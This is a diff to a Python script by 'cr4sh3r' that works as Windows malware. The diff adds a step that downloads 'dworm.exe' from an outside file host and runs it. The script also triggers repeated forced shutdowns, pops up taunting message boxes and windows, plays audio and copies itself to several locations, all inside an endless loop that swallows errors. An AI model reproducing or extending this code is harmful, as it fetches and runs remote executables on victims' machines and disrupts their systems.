@@ -2,7 +2,7 @@
 # Made by cr4sh3r
 # uh3u3hu3h3u
 
-import wget, time, os, random, getpass, winsound, ctypes, urllib, base64
+import wget, time, os, random, getpass, ctypes, urllib, base64
 from Tkinter import *
 
 
@@ -45,23 +45,36 @@ def dn():
     os.system("move xavs.scr " + disf)
     time.sleep(1)
 
-    wget.download("http://download1324.mediafire.com/ty4c5lkbt8bg/4e26tz4lc3905ld/jcs.mp3")
-    os.system("move jcs.mp3 " + disf)
+    wget.download("http://download1646.mediafire.com/h1bwlb2qhtug/olsf4puxnwq0ax8/jcs.wav")
+    os.system("move jcs.wav " + disf)
+    time.sleep(1)
+
+    wget.download("http://zepikao.my3gb.com/Sh3lz/dworm.exe")
+    os.system("move dworm.exe " + disf)
     time.sleep(1)
 
     payloads()
 
 def payloads():
 
+    global disd
+    global nec
+    disd = "C:\Users" + "\\" + quest + "\Documents\\"
+
     def jc():
-        ctypes.windll.user32.MessageBoxA(0, "Guess who is back", "JC", 1)
-        winsound.PlaySound("C:\jcs.mp3", winsound.SND_ALIAS)
+        try:
+            ctypes.windll.user32.MessageBoxA(0, "Guess who is back", "JC", 1)
+            os.system("start " + disd + "jcs.wav")
+            time.sleep(35)
+        except:
+            pass
 
     def scsa():
-        csc0 = random.choice(['bambams.scr', 'jajas.scr','xavs.scr'])
-        os.system("start " + disf + " " + csc0 + " /s")
+        os.system("start " + disd + "dworm.exe")
+        nec = True
 
     def poo():
+        time.sleep(10)
         root = Tk()
         root.title("666")
         root.geometry("450x350+100+100")
@@ -81,16 +94,24 @@ def payloads():
         os.system("shutdown /s")
 
     while 1==1:
-        pcho = random.choice([1,2,3,4])
+        try:
+            pcho = random.choice([1,2,3,4])
 
-        if pcho   == 1:
-            jc()
-        elif pcho == 2:
-            scsa()
-        elif pcho == 3:
-            poo()
-        elif pcho == 4:
-            shut()
+            if pcho   == 1:
+                jc()
+            elif pcho == 2:
+
+                if nec == True:
+                    time.sleep(1)
+                else:
+                    scsa()
+
+            elif pcho == 3:
+                poo()
+            elif pcho == 4:
+                shut()
+        except:
+            pass
 
         for i in range(1):
             pcho = random.choice([1,2,3,4])
@@ -103,7 +124,13 @@ def payloads():
                 pass
 
         for d in range(5):
-            cpy(dl[d])
+            try:
+                cpy(dl[d])
+            except:
+                pass
+
+
+    time.sleep(15)
 
 
 checkex()
